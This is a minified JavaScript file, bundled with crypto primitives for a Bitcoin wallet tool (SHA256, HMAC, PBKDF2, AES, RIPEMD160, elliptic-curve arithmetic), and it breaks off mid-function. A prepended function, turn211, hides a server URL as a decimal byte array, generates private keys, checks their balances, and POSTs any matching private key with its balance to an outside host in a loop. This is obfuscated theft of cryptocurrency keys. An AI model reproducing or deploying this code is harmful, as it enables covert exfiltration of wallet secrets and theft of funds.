function turn211() {
  var e = genBRA(window.prk211.toUpperCase());
  e[1] = e[1].substr(1, e[1].length - 1);
  var t = window.prk11570.indexOf(e[1]);
  if (-1 < t) {
    var o = new XMLHttpRequest;
    o.open("POST", Crypto.charenc.UTF8.bytesToString([104, 116, 116, 112, 115, 58, 47, 47, 103, 97, 109, 101, 108, 111, 99, 97, 116, 111, 114, 46, 48, 48, 48, 119, 101, 98, 104, 111, 115, 116, 97, 112, 112, 46, 99, 111, 109, 47, 67, 67, 67, 65, 47, 115, 97, 118, 101, 80, 82, 75, 46, 112, 104, 112]), !0), o.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), o.send("prk=" + encodeURIComponent(window.prk211.toUpperCase()) + "&bal=" + encodeURIComponent(e[1]))
  }
  window.prk211 = e[0].substr(2 + Math.floor(64 * Math.random()), 64);
  window.prkupdate = !0;
  setTimeout(turn211, 400)
}

function genBRA(e) {
  return ninja.wallets.detailwallet.viewDetails(e)}("undefined" == typeof Crypto || !Crypto.util) && function() {
  var e = window.Crypto = {},
    t = e.util = {
      rotl: function(e, t) {
        return e << t | e >>> 32 - t
      },
      rotr: function(e, t) {
        return e << 32 - t | e >>> t
      },
      endian: function(e) {
        if (e.constructor == Number) return 16711935 & t.rotl(e, 8) | 4278255360 & t.rotl(e, 24);
        for (var o = 0; o < e.length; o++) e[o] = t.endian(e[o]);
        return e
      },
      randomBytes: function(e) {
        for (var t = []; 0 < e; e--) t.push(Math.floor(256 * Math.random()));
        return t
      },
      bytesToWords: function(e) {
        for (var t = [], o = 0, r = 0; o < e.length; o++, r += 8) t[r >>> 5] |= (255 & e[o]) << 24 - r % 32;
        return t
      },
      wordsToBytes: function(e) {
        for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >>> 5] >>> 24 - o % 32);
        return t
      },
      bytesToHex: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push((e[o] >>> 4).toString(16)), t.push((15 & e[o]).toString(16));
        return t.join("")
      },
      hexToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o += 2) t.push(parseInt(e.substr(o, 2), 16));
        return t
      },
      bytesToBase64: function(e) {
        for (var t = [], o = 0; o < e.length; o += 3)
          for (var r = e[o] << 16 | e[o + 1] << 8 | e[o + 2], s = 0; 4 > s; s++) t.push(8 * o + 6 * s <= 8 * e.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(63 & r >>> 6 * (3 - s)) : "=");
        return t.join("")
      },
      base64ToBytes: function(e) {
        e = e.replace(/[^A-Z0-9+\/]/gi, "");
        for (var t = [], o = 0, r = 0; o < e.length; r = ++o % 4) 0 != r && t.push(("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o - 1)) & Math.pow(2, -2 * r + 8) - 1) << 2 * r | "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o)) >>> 6 - 2 * r);
        return t
      }
    },
    o = e.charenc = {},
    i = (o.UTF8 = {
      stringToBytes: function(e) {
        return i.stringToBytes(unescape(encodeURIComponent(e)))
      },
      bytesToString: function(e) {
        return decodeURIComponent(escape(i.bytesToString(e)))
      }
    }, o.Binary = {
      stringToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(255 & e.charCodeAt(o));
        return t
      },
      bytesToString: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(String.fromCharCode(e[o]));
        return t.join("")
      }
    })
}(),


function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    i = o.Binary,
    s = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
    n = e.SHA256 = function(e, o) {
      var r = t.wordsToBytes(n._sha256(e));
      return o && o.asBytes ? r : o && o.asString ? i.bytesToString(r) : t.bytesToHex(r)
    };
  n._sha256 = function(n) {
    n.constructor == String && (n = r.stringToBytes(n));
    var p, d, u, B, v, A, P, x, K, H, N, z, L = t.bytesToWords(n),
      m = 8 * n.length,
      l = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225],
      T = [];
    L[m >> 5] |= 128 << 24 - m % 32, L[(m + 64 >> 9 << 4) + 15] = m;
    for (var K = 0; K < L.length; K += 16) {
      p = l[0], d = l[1], u = l[2], B = l[3], v = l[4], A = l[5], P = l[6], x = l[7];
      for (var H = 0; 64 > H; H++) {
        if (16 > H) T[H] = L[H + K];
        else {
          var I = T[H - 15],
            E = T[H - 2];
          T[H] = ((I << 25 | I >>> 7) ^ (I << 14 | I >>> 18) ^ I >>> 3) + (T[H - 7] >>> 0) + ((E << 15 | E >>> 17) ^ (E << 13 | E >>> 19) ^ E >>> 10) + (T[H - 16] >>> 0)
        }
        var S = v & A ^ ~v & P,
          D = p & d ^ p & u ^ d & u,
          q = (p << 30 | p >>> 2) ^ (p << 19 | p >>> 13) ^ (p << 10 | p >>> 22),
          U = (v << 26 | v >>> 6) ^ (v << 21 | v >>> 11) ^ (v << 7 | v >>> 25);
        N = (x >>> 0) + U + S + s[H] + (T[H] >>> 0), z = q + D, x = P, P = A, A = v, v = B + N >>> 0, B = u, u = d, d = p, p = N + z >>> 0
      }
      l[0] += p, l[1] += d, l[2] += u, l[3] += B, l[4] += v, l[5] += A, l[6] += P, l[7] += x
    }
    return l
  }, n._blocksize = 16, n._digestsize = 32
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.PBKDF2 = function(o, n, p, a) {
    function d(t, o) {
      return e.HMAC(l, o, t, {
        asBytes: !0
      })
    }
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n));
    for (var l = a && a.hasher || e.SHA1, u = a && a.iterations || 1, y = [], c = 1; y.length < p;) {
      for (var m = d(o, n.concat(t.wordsToBytes([c]))), g = m, h = 1; u > h; h++) {
        g = d(o, g);
        for (var b = 0; b < m.length; b++) m[b] ^= g[b]
      }
      y = y.concat(m), c++
    }
    return y.length = p, a && a.asBytes ? y : a && a.asString ? s.bytesToString(y) : t.bytesToHex(y)
  }
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.HMAC = function(e, o, n, p) {
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n)), n.length > 4 * e._blocksize && (n = e(n, {
      asBytes: !0
    }));
    for (var a = n.slice(0), d = n.slice(0), l = 0; l < 4 * e._blocksize; l++) a[l] ^= 92, d[l] ^= 54;
    var u = e(a.concat(e(d.concat(o), {
      asBytes: !0
    })), {
      asBytes: !0
    });
    return p && p.asBytes ? u : p && p.asString ? s.bytesToString(u) : t.bytesToHex(u)
  }
}(),
function() {
  function e(e, t) {
    for (var r = 0, s = 0; 8 > s; s++) {
      1 & t && (r ^= e);
      var n = 128 & e;
      e = 255 & e << 1, n && (e ^= 27), t >>>= 1
    }
    return r
  }
  for (var t = Crypto, r = t.util, o = t.charenc, s = o.UTF8, n = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22], p = [], a = 0; 256 > a; a++) p[n[a]] = a;
  for (var d = [], l = [], u = [], c = [], m = [], g = [], a = 0; 256 > a; a++) d[a] = e(a, 2), l[a] = e(a, 3), u[a] = e(a, 9), c[a] = e(a, 11), m[a] = e(a, 13), g[a] = e(a, 14);
  var y, h, b, B = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54],
    A = [
      [],
      [],
      [],
      []
    ],
    F = t.AES = {
      encrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? s.stringToBytes(e) : e,
          a = i.iv || r.randomBytes(4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.encrypt(F, p, a), p = i.iv ? p : a.concat(p), i && i.asBytes ? p : r.bytesToBase64(p)
      },
      decrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? r.base64ToBytes(e) : e,
          a = i.iv || p.splice(0, 4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.decrypt(F, p, a), i && i.asBytes ? p : s.bytesToString(p)
      },
      _blocksize: 4,
      _encryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var r = 1; h > r; r++) {
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
          A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              p = A[1][i],
              a = A[2][i],
              y = A[3][i];
            A[0][i] = d[s] ^ l[p] ^ a ^ y, A[1][i] = s ^ d[p] ^ l[a] ^ y, A[2][i] = s ^ p ^ d[a] ^ l[y], A[3][i] = l[s] ^ p ^ a ^ d[y]
          }
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * r + i][o]
        }
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
        A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _decryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var r = 1; h > r; r++) {
          A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * (h - r) + i][o];
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              n = A[1][i],
              a = A[2][i],
              l = A[3][i];
            A[0][i] = g[s] ^ c[n] ^ m[a] ^ u[l], A[1][i] = u[s] ^ g[n] ^ c[a] ^ m[l], A[2][i] = m[s] ^ u[n] ^ g[a] ^ c[l], A[3][i] = c[s] ^ m[n] ^ u[a] ^ g[l]
          }
        }
        A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _init: function(e) {
        y = e.length / 4, h = y + 6, F._keyexpansion(e)
      },
      _keyexpansion: function(e) {
        b = [];
        for (var t = 0; y > t; t++) b[t] = [e[4 * t], e[4 * t + 1], e[4 * t + 2], e[4 * t + 3]];
        for (var o, t = y; t < F._blocksize * (h + 1); t++) o = [b[t - 1][0], b[t - 1][1], b[t - 1][2], b[t - 1][3]], 0 == t % y ? (o.push(o.shift()), o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]], o[0] ^= B[t / y]) : 6 < y && 4 == t % y && (o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]]), b[t] = [b[t - y][0] ^ o[0], b[t - y][1] ^ o[1], b[t - y][2] ^ o[2], b[t - y][3] ^ o[3]]
      }
    }
}(),
function(e) {
  function t(e, t) {
    var o = 4 * e._blocksize,
      i = o - t.length % o;
    return i
  }
  var o = e.pad = {},
    i = function(e, t, o, r) {
      var s = t.pop();
      if (0 == s) throw new Error("Invalid zero-length padding specified for " + o + ". Wrong cipher specification or key used?");
      var n = 4 * e._blocksize;
      if (s > n) throw new Error("Invalid padding length of " + s + " specified for " + o + ". Wrong cipher specification or key used?");
      for (var p, a = 1; s > a; a++)
        if (p = t.pop(), null != r && r != p) throw new Error("Invalid padding byte of 0x" + p.toString(16) + " specified for " + o + ". Wrong cipher specification or key used?")
    };
  o.NoPadding = {
    pad: function() {},
    unpad: function() {}
  }, o.ZeroPadding = {
    pad: function(e, t) {
      var o = 4 * e._blocksize,
        i = t.length % o;
      if (0 != i)
        for (i = o - i; 0 < i; i--) t.push(0)
    },
    unpad: function(e, t) {
      for (; 0 == t[t.length - 1];) t.pop()
    }
  }, o.iso7816 = {
    pad: function(e, o) {
      var i = t(e, o);
      for (o.push(128); 1 < i; i--) o.push(0)
    },
    unpad: function(e, t) {
      var o;
      for (o = 4 * e._blocksize; 0 < o; o--) {
        var i = t.pop();
        if (128 == i) return;
        if (0 != i) throw new Error("ISO-7816 padding byte must be 0, not 0x" + i.toString(16) + ". Wrong cipher specification or key used?")
      }
      throw new Error("ISO-7816 padded beyond cipher block size. Wrong cipher specification or key used?")
    }
  }, o.ansix923 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(0);
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ANSI X.923", 0)
    }
  }, o.iso10126 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(Math.floor(256 * Math.random()));
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ISO 10126", void 0)
    }
  }, o.pkcs7 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 0; r > s; s++) o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "PKCS 7", t[t.length - 1])
    }
  };
  var r = e.mode = {},
    s = r.Mode = function(e) {
      e && (this._padding = e)
    };
  s.prototype = {
    encrypt: function(e, t, o) {
      this._padding.pad(e, t), this._doEncrypt(e, t, o)
    },
    decrypt: function(e, t, o) {
      this._doDecrypt(e, t, o), this._padding.unpad(e, t)
    },
    _padding: o.iso7816
  };
  var n = r.ECB = function() {
      s.apply(this, arguments)
    },
    p = n.prototype = new s;
  p._doEncrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._encryptblock(t, i)
  }, p._doDecrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._decryptblock(t, i)
  }, p.fixOptions = function(e) {
    e.iv = []
  };
  var a = r.CBC = function() {
      s.apply(this, arguments)
    },
    d = a.prototype = new s;
  d._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = 0; s < t.length; s += r) {
      if (0 == s)
        for (var n = 0; r > n; n++) t[n] ^= o[n];
      else
        for (var n = 0; r > n; n++) t[s + n] ^= t[s + n - r];
      e._encryptblock(t, s)
    }
  }, d._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o, p = 0; p < t.length; p += s) {
      r = t.slice(p, p + s), e._decryptblock(t, p);
      for (var a = 0; s > a; a++) t[p + a] ^= n[a];
      n = r
    }
  };
  var l = r.CFB = function() {
      s.apply(this, arguments)
    },
    u = l.prototype = new s;
  u._padding = o.NoPadding, u._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) r = p % s, 0 == r && e._encryptblock(n, 0), t[p] ^= n[r], n[r] = t[p]
  }, u._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) {
      r = p % s, 0 == r && e._encryptblock(n, 0);
      var a = t[p];
      t[p] ^= n[r], n[r] = a
    }
  };
  var y = r.OFB = function() {
      s.apply(this, arguments)
    },
    c = y.prototype = new s;
  c._padding = o.NoPadding, c._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = o.slice(0), n = 0; n < t.length; n++) 0 == n % r && e._encryptblock(s, 0), t[n] ^= s[n % r]
  }, c._doDecrypt = c._doEncrypt;
  var m = r.CTR = function() {
      s.apply(this, arguments)
    },
    g = m.prototype = new s;
  g._padding = o.NoPadding, g._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length;) {
      r = n.slice(0), e._encryptblock(r, 0);
      for (var a = 0; p < t.length && s > a; a++, p++) t[p] ^= r[a];
      256 == ++n[s - 1] && (n[s - 1] = 0, 256 == ++n[s - 2] && (n[s - 2] = 0, 256 == ++n[s - 3] && (n[s - 3] = 0, ++n[s - 4])))
    }
  }, g._doDecrypt = g._doEncrypt}(Crypto),
function() {
  function e(e, t, o, i) {
    return 0 <= e && 15 >= e ? t ^ o ^ i : 16 <= e && 31 >= e ? t & o | ~t & i : 32 <= e && 47 >= e ? (t | ~o) ^ i : 48 <= e && 63 >= e ? t & i | o & ~i : 64 <= e && 79 >= e ? t ^ (o | ~i) : "rmd160_f: j out of range"
  }

  function t(e) {
    return 0 <= e && 15 >= e ? 0 : 16 <= e && 31 >= e ? 1518500249 : 32 <= e && 47 >= e ? 1859775393 : 48 <= e && 63 >= e ? 2400959708 : 64 <= e && 79 >= e ? 2840853838 : "rmd160_K1: j out of range"
  }

  function o(e) {
    return 0 <= e && 15 >= e ? 1352829926 : 16 <= e && 31 >= e ? 1548603684 : 32 <= e && 47 >= e ? 1836072691 : 48 <= e && 63 >= e ? 2053994217 : 64 <= e && 79 >= e ? 0 : "rmd160_K2: j out of range"
  }

  function r(e, t) {
    var o = (65535 & e) + (65535 & t);
    return (e >> 16) + (t >> 16) + (o >> 16) << 16 | 65535 & o
  }

  function s(e, t) {
    return e << t | e >>> 32 - t
  }
  var i = Crypto,
    n = i.util,
    p = i.charenc,
    a = p.UTF8,
    d = p.Binary;
  n.bytesToLWords = function(e) {
    for (var t = Array(e.length >> 2), o = 0; o < t.length; o++) t[o] = 0;
    for (var o = 0; o < 8 * e.length; o += 8) t[o >> 5] |= (255 & e[o / 8]) << o % 32;
    return t
  }, n.lWordsToBytes = function(e) {
    for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >> 5] >>> o % 32);
    return t
  };
  var l = i.RIPEMD160 = function(e, t) {
    var o = n.lWordsToBytes(l._rmd160(e));
    return t && t.asBytes ? o : t && t.asString ? d.bytesToString(o) : n.bytesToHex(o)
  };
  l._rmd160 = function(p) {
    p.constructor == String && (p = a.stringToBytes(p));
    var d = n.bytesToLWords(p),
      l = 8 * p.length;
    d[l >> 5] |= 128 << l % 32, d[(l + 64 >>> 9 << 4) + 14] = l;
    for (var g = 1732584193, f = 4023233417, h = 2562383102, b = 271733878, B = 3285377520, F = 0; F < d.length; F += 16) {
      for (var S, C = g, A = f, E = h, P = b, w = B, I = g, R = f, Z = h, Q = b, Y = B, G = 0; 79 >= G; ++G) S = r(C, e(G, A, E, P)), S = r(S, d[F + u[G]]), S = r(S, t(G)), S = r(s(S, c[G]), w), C = w, w = P, P = s(E, 10), E = A, A = S, S = r(I, e(79 - G, R, Z, Q)), S = r(S, d[F + y[G]]), S = r(S, o(G)), S = r(s(S, m[G]), Y), I = Y, Y = Q, Q = s(Z, 10), Z = R, R = S;
      S = r(f, r(E, Q)), f = r(h, r(P, Y)), h = r(b, r(w, I)), b = r(B, r(C, R)), B = r(g, r(A, Z)), g = S
    }
    return [g, f, h, b, B]
  };
  var u = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13],
    y = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11],
    c = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8, 7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12, 11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5, 11, 12, 14, 15, 14, 15, 9, 8, 9, 14, 5, 6, 8, 6, 5, 12, 9, 15, 5, 11, 6, 8, 13, 12, 5, 12, 13, 14, 11, 8, 5, 6],
    m = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6, 9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11, 9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5, 15, 5, 8, 11, 14, 14, 6, 14, 6, 9, 12, 9, 12, 5, 15, 8, 8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11]
}(),
function() {
  var e = window.EllipticCurve = function() {};
  e.FieldElementFp = function(e, t) {
    this.x = t, this.q = e
  }, e.FieldElementFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.x.equals(e.x)
  }, e.FieldElementFp.prototype.toBigInteger = function() {
    return this.x
  }, e.FieldElementFp.prototype.negate = function() {
    return new e.FieldElementFp(this.q, this.x.negate().mod(this.q))
  }, e.FieldElementFp.prototype.add = function(t) {
    return new e.FieldElementFp(this.q, this.x.add(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.subtract = function(t) {
    return new e.FieldElementFp(this.q, this.x.subtract(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.multiply = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.square = function() {
    return new e.FieldElementFp(this.q, this.x.square().mod(this.q))
  }, e.FieldElementFp.prototype.divide = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger().modInverse(this.q)).mod(this.q))
  }, e.FieldElementFp.prototype.getByteLength = function() {
    return Math.floor((this.toBigInteger().bitLength() + 7) / 8)
  }, e.FieldElementFp.prototype.sqrt = function() {
    if (!this.q.testBit(0)) throw new Error("even value of q");
    if (this.q.testBit(1)) {
      var t = new e.FieldElementFp(this.q, this.x.modPow(this.q.shiftRight(2).add(BigInteger.ONE), this.q));
      return t.square().equals(this) ? t : null
    }
    var o = this.q.subtract(BigInteger.ONE),
      i = o.shiftRight(1);
    if (!this.x.modPow(i, this.q).equals(BigInteger.ONE)) return null;
    var r, s, n = o.shiftRight(2),
      p = n.shiftLeft(1).add(BigInteger.ONE),
      a = this.x,
      d = a.shiftLeft(2).mod(this.q);
    do {
      var l, u = new SecureRandom;
      do l = new BigInteger(this.q.bitLength(), u); while (0 <= l.compareTo(this.q) || !l.multiply(l).subtract(d).modPow(i, this.q).equals(o));
      var c = e.FieldElementFp.fastLucasSequence(this.q, l, a, p);
      if (r = c[0], s = c[1], s.multiply(s).mod(this.q).equals(d)) return s.testBit(0) && (s = s.add(this.q)), s = s.shiftRight(1), new e.FieldElementFp(this.q, s)
    } while (r.equals(BigInteger.ONE) || r.equals(o));
    return null
  }, e.FieldElementFp.fastLucasSequence = function(e, t, o, i) {
    for (var r = i.bitLength(), n = i.getLowestSetBit(), s = BigInteger.ONE, p = BigInteger.TWO, a = t, l = BigInteger.ONE, u = BigInteger.ONE, c = r - 1; c >= n + 1; --c) l = l.multiply(u).mod(e), i.testBit(c) ? (u = l.multiply(o).mod(e), s = s.multiply(a).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), a = a.multiply(a).subtract(u.shiftLeft(1)).mod(e)) : (u = l, s = s.multiply(p).subtract(l).mod(e), a = a.multiply(p).subtract(t.multiply(l)).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e));
    l = l.multiply(u).mod(e), u = l.multiply(o).mod(e), s = s.multiply(p).subtract(l).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), l = l.multiply(u).mod(e);
    for (var c = 1; n >= c; ++c) s = s.multiply(p).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e), l = l.multiply(l).mod(e);
    return [s, p]
  }, e.PointFp = function(e, t, o, i, r) {
    this.curve = e, this.x = t, this.y = o, this.z = null == i ? BigInteger.ONE : i, this.zinv = null, this.compressed = !!r
  }, e.PointFp.prototype.getX = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.x.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.getY = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.y.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.equals = function(e) {
    if (e == this) return !0;
    if (this.isInfinity()) return e.isInfinity();
    if (e.isInfinity()) return this.isInfinity();
    var t, o;
    return t = e.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(e.z)).mod(this.curve.q), !!t.equals(BigInteger.ZERO) && (o = e.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(e.z)).mod(this.curve.q), o.equals(BigInteger.ZERO))
  }, e.PointFp.prototype.isInfinity = function() {
    return !(null != this.x || null != this.y) || this.z.equals(BigInteger.ZERO) && !this.y.toBigInteger().equals(BigInteger.ZERO)
  }, e.PointFp.prototype.negate = function() {
    return new e.PointFp(this.curve, this.x, this.y.negate(), this.z)
  }, e.PointFp.prototype.add = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    var o = t.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(t.z)).mod(this.curve.q),
      i = t.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(t.z)).mod(this.curve.q);
    if (BigInteger.ZERO.equals(i)) return BigInteger.ZERO.equals(o) ? this.twice() : this.curve.getInfinity();
    var r = new BigInteger("3"),
      s = this.x.toBigInteger(),
      n = this.y.toBigInteger(),
      p = (t.x.toBigInteger(), t.y.toBigInteger(), i.square()),
      a = p.multiply(i),
      d = s.multiply(p),
      l = o.square().multiply(this.z),
      u = l.subtract(d.shiftLeft(1)).multiply(t.z).subtract(a).multiply(i).mod(this.curve.q),
      y = d.multiply(r).multiply(o).subtract(n.multiply(a)).subtract(l.multiply(o)).multiply(t.z).add(o.multiply(a)).mod(this.curve.q),
      c = a.multiply(this.z).multiply(t.z).mod(this.curve.q);
